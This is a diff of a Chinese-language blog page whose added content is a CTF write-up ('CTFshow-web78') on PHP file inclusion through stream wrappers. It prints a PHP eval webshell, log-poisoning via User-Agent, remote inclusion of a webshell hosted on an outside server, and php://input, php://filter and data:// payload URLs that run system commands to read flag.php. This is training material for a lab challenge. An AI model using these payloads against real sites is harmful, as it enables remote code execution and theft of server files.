@@ -11,6 +11,11 @@
   
   <title>
     
+      CTFshow-web78 
+      
+      
+      |
+    
      slug01sh
   </title>
 
@@ -101,69 +106,196 @@
 
 
       <div class="flex-container">
-        <div class="container index">
-  <div class="post-list">
-    <!-- 遍历渲染文章 -->
-    
-      <div class="post-item" title="CTFshow-web78">
-        <div class="time-m-d">2021-07-11</div>
-        <div class="title">
-          <a href="/b1c7d97662f2/">
-            
-              
-                <span>CTFshow-web78</span>
-              
-            
-          </a>
-        </div>
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CTFshow-web78</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2021-07-11 19:33:07
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/ctf/" title="ctf">
+                    <b>#</b> ctf
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="php文件包含">
+                    <b>#</b> php文件包含
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
-    
-      <div class="post-item" title="开源项目-AoiAWD一键部署">
-        <div class="time-m-d">2021-07-09</div>
-        <div class="title">
-          <a href="/c5c098b97076/">
-            
-              
-                <span>开源项目-AoiAWD一键部署</span>
-              
-            
-          </a>
-        </div>
+      <div class="markdown-body">
+        <ul>
+<li>常见的 php 伪协议对照表：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210705222420.png"></li>
+<li>PHP官方支持的协议和封装协议：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711200624.png"></li>
+</ul>
+<h1 id="1-file-或-不使用协议"><a href="#1-file-或-不使用协议" class="headerlink" title="1 file:// 或 不使用协议"></a>1 file:// 或 不使用协议</h1><p>（将文件直接读入，无法进行编码，会被 php 执行）</p>
+<blockquote>
+<p> 包含一句话木马，实现代码执行来读取 flag。</p>
+</blockquote>
+<ul>
+<li>访问URL<code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=file:///var/log/nginx/access.log</code>，来确定是否能读取 nginx 的日志。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711201751.png"></li>
+<li>确定可以访问 nginx 的日志后。使用Burp进行抓包，并修改 User-Agent 为 <code>&lt;?php @eval($_GET[code]);echo PHP_DATADIR;?&gt;</code><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711201934.png"></li>
+<li>再次访问 <code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=file:///var/log/nginx/access.log</code> 即可查看 PHP 的执行路径。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711202157.png"></li>
+<li>访问URL<code>view-source:http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=file:///var/log/nginx/access.log&amp;code=system(&#39;cat flag.php&#39;);</code>，即可看到flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711202332.png"></li>
+</ul>
+<h1 id="2-http"><a href="#2-http" class="headerlink" title="2 http://"></a>2 http://</h1><blockquote>
+<p>远程文件包含，实现代码执行来读取 flag。</p>
+</blockquote>
+<ul>
+<li>创建远程文件，写入一句话木马。url为<code>https://blog-1256032382.cos.ap-nanjing.myqcloud.com/eval.php</code>。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[code]);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>访问URL<code>view-source:http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=https://blog-1256032382.cos.ap-nanjing.myqcloud.com/eval.php&amp;code=system(&#39;cat flag.php&#39;);</code>即可获得 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711202803.png"></li>
+</ul>
+<h1 id="3-php"><a href="#3-php" class="headerlink" title="3 php://"></a>3 php://</h1><h2 id="3-1-php-input"><a href="#3-1-php-input" class="headerlink" title="3.1 php://input"></a>3.1 php://input</h2><ul>
+<li>使用 Burp 进行抓包，修改 file 参数为 <code>php://input</code>，在下方添加 POST 参数为 <code>&lt;?php @eval($_GET[code]);echo PHP_DATADIR;?&gt;</code>。如下图所示<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203050.png"></li>
+<li>修改GET参数为<code>/?file=php://input&amp;code=system(&#39;cat%20flag.php&#39;);</code><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203235.png"></li>
+</ul>
+<h2 id="3-2-php-filter"><a href="#3-2-php-filter" class="headerlink" title="3.2 php://filter"></a>3.2 php://filter</h2><ul>
+<li>访问URL<code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=php://filter/convert.base64-encode/resource=flag.php</code>。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203715.png"></li>
+<li>对返回的Base64值进行解码，即可获得 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203815.png"></li>
+</ul>
+<h1 id="4-zlib"><a href="#4-zlib" class="headerlink" title="4 zlib://"></a>4 zlib://</h1><p>同 <code>file://</code></p>
+<h1 id="5-data"><a href="#5-data" class="headerlink" title="5 data://"></a>5 data://</h1><ul>
+<li>访问 URL<code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=data:text/plain,&lt;?php system(&#39;base64 flag.php&#39;);?&gt;</code>。</li>
+</ul>
+<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711204543.png"></p>
+<ul>
+<li>解码返回的 Base64，即可得到flag。<blockquote>
+<p>当然可以使用 data 的其他变形。例如：<code>data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code></p>
+</blockquote>
+</li>
+</ul>
+
       </div>
-    
-      <div class="post-item" title="blog的时间线">
-        <div class="time-m-d">2021-07-05</div>
-        <div class="title">
-          <a href="/e3bb9d03d772/">
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-              
-                <span>blog的时间线</span>
-              
+              <a href="/c5c098b97076/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
             
-          </a>
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2021-07-11 19:33:07
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/ctf/" title="ctf">
+                        <b>#</b> ctf
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="php文件包含">
+                        <b>#</b> php文件包含
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
         </div>
-      </div>
+      
+    </div>
     
-      <div class="post-item" title="Hello world">
-        <div class="time-m-d">2021-07-05</div>
-        <div class="title">
-          <a href="/2728c2e57855/">
-            
-              
-                <span>Hello world</span>
-              
-            
-          </a>
-        </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-file-%E6%88%96-%E4%B8%8D%E4%BD%BF%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">1 file:&#x2F;&#x2F; 或 不使用协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-http"><span class="toc-text">2 http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-php"><span class="toc-text">3 php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-php-input"><span class="toc-text">3.1 php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-php-filter"><span class="toc-text">3.2 php:&#x2F;&#x2F;filter</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-zlib"><span class="toc-text">4 zlib:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-data"><span class="toc-text">5 data:&#x2F;&#x2F;</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+  <div id="vcomments"></div>
+
+  <script>
+    new Valine({
+      el: '#vcomments',
+      appId: 'ikvSzWGgS2Gj6eMcU18rNJ0T-gzGzoHsz',
+      appKey: '8JFk6edtiIlTX0CcOOnneFWO',
+      placeholder: 'Welcome!',
+      avatar: 'retro',
+      lang: 'zh-CN'
+    })
+  </script>
+
+
+
+
       </div>
     
   </div>
-  <nav class="post-navigation">
-    
-    <span class="page-num">1 / 1</span>
-    
-  </nav>
-</div>
+
 
         <div class="footer">
   <div class="social">
